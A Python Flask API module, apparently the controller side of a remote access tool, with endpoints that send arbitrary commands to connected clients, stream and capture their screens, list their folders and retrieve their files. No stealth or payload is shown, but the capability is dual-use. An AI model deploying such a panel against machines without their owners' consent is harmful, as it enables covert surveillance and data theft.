from flask import Blueprint, jsonify, request, send_file, Response
from server import *
import json, base64

no_result = Protocol(extension='no_result')

def check_client(func):
    def wrapper(client_uuid, *args):
        if not connection_thread.is_alive():
            return no_result
        if not is_alive(client_uuid):
            return no_result
        return func(client_uuid, *args)
    return wrapper

@check_client
def oneline_command(client_uuid:str, command:str, data=None) -> Protocol:
    client_socket = online_clients[client_uuid][0]
    with client_locks[client_uuid]:
        client_status[client_uuid] = command
        Protocol(extension=command).upmeta(data).create_stream(client_socket.send)
        respond = Protocol().load_stream(client_socket.recv)
        client_status[client_uuid] = ''
    return respond

@check_client
def load_screen_stream(client_uuid:str, quality:int):
    client_socket = online_clients[client_uuid][0]
    with client_locks[client_uuid]:
        client_status[client_uuid] = 'screen_stream'
        request = Protocol(extension='screen_stream')
        request.upmeta({
            'quality':quality
        }).create_stream(client_socket.send)
        while True:
            respond = Protocol().load_stream(client_socket.recv)
            Protocol(extension='OK').create_stream(client_socket.send)
            yield (b'--frame\r\n Content-Type: image/jpeg\r\n\r\n' + respond.meta)



web_api = Blueprint('api', __name__)

@web_api.route('/relink', methods=['GET'])
def relink():
    client_uuid = request.args.get('uuid', '')
    if client_uuid in online_clients.keys():
        client_ends[client_uuid] = True
    return 'OK'

@web_api.route('/online_clients', methods=['GET'])
def get_online_clients():
    check_alive()
    with lock:
        client_addresses = {client_uuid: [value[0].getpeername(), value[1]] for client_uuid, value in online_clients.items()}
    return jsonify(client_addresses)

@web_api.route('/start_server', methods=['GET'])
def start_server():
    if connection_thread.is_alive():
        return 'Server is already running.'
    else:
        connection_thread.start()
        return 'Server started.'

@web_api.route('/server_status', methods=['GET'])
def server_status():
    if connection_thread.is_alive():
        return 'online'
    else:
        return 'offline'

@web_api.route('/command', methods=['GET'])
def command():
    client_uuid = request.args.get('uuid', '')
    command = request.args.get('cmd', '')
    data = request.args.get('data', '')
    respond = oneline_command(client_uuid, command, data)
    return jsonify(respond.json)

@web_api.route('/folder_files', methods=['GET'])
def folder_files():
    client_uuid = request.args.get('uuid', '')
    data = request.args.get('directory', '')
    data = base64.b64decode(data).decode(encoding='utf-8')
    respond = oneline_command(client_uuid, 'folder_files', {
        'directory': data
    })
    return json.dumps(respond.json)

@web_api.route('/screenshot', methods=['GET'])
def screenshot():
    client_uuid = request.args.get('uuid', '')
    respond = oneline_command(client_uuid, 'screenshot')
    return send_file(respond, mimetype='image/jpeg')

@web_api.route('/screen_stream', methods=['GET'])
def screen_stream():
    client_uuid = request.args.get('uuid', '')
    quality = request.args.get('quality', 50)
    try: quality = int(quality)
    except: quality = 50
    if not is_alive(client_uuid): return ''
    return Response(load_screen_stream(client_uuid, quality), mimetype='multipart/x-mixed-replace; boundary=frame')

@web_api.route('/trans_file', methods=['GET'])
def trans_file():
    client_uuid = request.args.get('uuid', '')
    data = request.args.get('directory', '')
    data = base64.b64decode(data).decode(encoding='utf-8')
    respond = oneline_command(client_uuid, 'trans_file', {
        'directory': data
    })
    return str(respond.meta)